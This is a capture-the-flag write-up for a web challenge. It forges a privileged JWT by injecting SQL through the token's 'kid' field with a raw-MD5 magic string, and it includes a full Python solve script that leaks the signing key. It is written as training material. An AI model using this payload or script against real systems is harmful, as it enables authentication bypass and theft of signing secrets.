---
created: 2024-06-28T20:52
updated: 2024-07-07T23:06
---

## Analyze
A quick analysis of the network requests tells me that I have to sign my own JWT with the type `conductor` and a different kid.

```json
{
  "alg": "HS256",
  "kid": "passenger_key",
  "typ": "JWT"
}
```

```json
{
  "type": "passenger"
}
```

Using a random key doesn't work.

```
Key isn't passenger or conductor. Please sign your own tickets.
```

### Hint
The message returned has hash in messy unicode, that's peculiar, and it appears that the server is querying based on raw md5, using unsafe string concatenation.

```js
// i could not get sqlite to work on the frontend :(
      /*
        db.each(`SELECT * FROM keys WHERE kid = '${md5(headerKid)}'`, (err, row) => {
        ???????
       */
```

## Solve
We will reference past writeups [^1], and use their payload for md5 exploitation.
The basic idea is that raw md5 of this payload will result in a sql injection like this

```sql
SELECT login FROM admins WHERE password = 'xxx'||'1xxxxxxxx'
```

```python
encoded_token = jwt.encode(decoded_token, secret, algorithm="HS256", headers={"kid": "129581926211651571912466741651878684928"})
```

We will first modify the header's kid, without changing anything.

```
Sorry passenger, only conductors are allowed right now. Please sign your own tickets. 
hashed ô÷uÞIB♣BçÙ+ secret: conductor_key_873affdf8cc36a592ec790fc62973d55f4bf43b321bf1ccc0514063370356d5cddb4363b4786fd072d36a25e0ab60a78b8df01bd396c7a05cccbbb3733ae3f8e
hashed Rò▲sÜxÉÄ☻Å´↕\ä secret: a_boring_passenger_signing_key_?
```

SQL injection worked and we have our conductor key.

### Solve Script

```python
import requests
import re
import jwt

url = "https://fare-evasion.chal.uiuc.tf/"

response = requests.get(url)
set_cookie = response.headers.get("Set-Cookie")
access_token = re.search(r'access_token=(.*?);', set_cookie).group(1)
decoded_token = jwt.decode(access_token, algorithms=["HS256"], options={"verify_signature": False})
decoded_token['type'] = 'conductor'

# sql inject with raw md5 hash
secret = "a_boring_passenger_signing_key_?"
encoded_token = jwt.encode(decoded_token, secret, algorithm="HS256", headers={"kid": "129581926211651571912466741651878684928"})
headers = {"Cookie": f"access_token={encoded_token}"}
response = requests.post(url + "pay", headers=headers)
msg = response.json()['message']
print(msg)
conductor_key = re.search(r'secret: (.+)\n', msg).group(1)
# "conductor_key_873affdf8cc36a592ec790fc62973d55f4bf43b321bf1ccc0514063370356d5cddb4363b4786fd072d36a25e0ab60a78b8df01bd396c7a05cccbbb3733ae3f8e"
encoded_token = jwt.encode(decoded_token, conductor_key, algorithm="HS256", headers={"kid": "conductor_wkey"})
headers = {
    "Cookie": f"access_token={encoded_token}"
}
response = requests.post(url + "pay", headers=headers)
msg = response.json()['message']
print(msg)
# Conductor override success. uiuctf{sigpwny_does_not_condone_turnstile_hopping!}
```

[^1]: [SQL injection with raw MD5 hashes (Leet More CTF 2010 injection 300) - Christian von Kleist (posthaven.com)](https://cvk.posthaven.com/sql-injection-with-raw-md5-hashes)
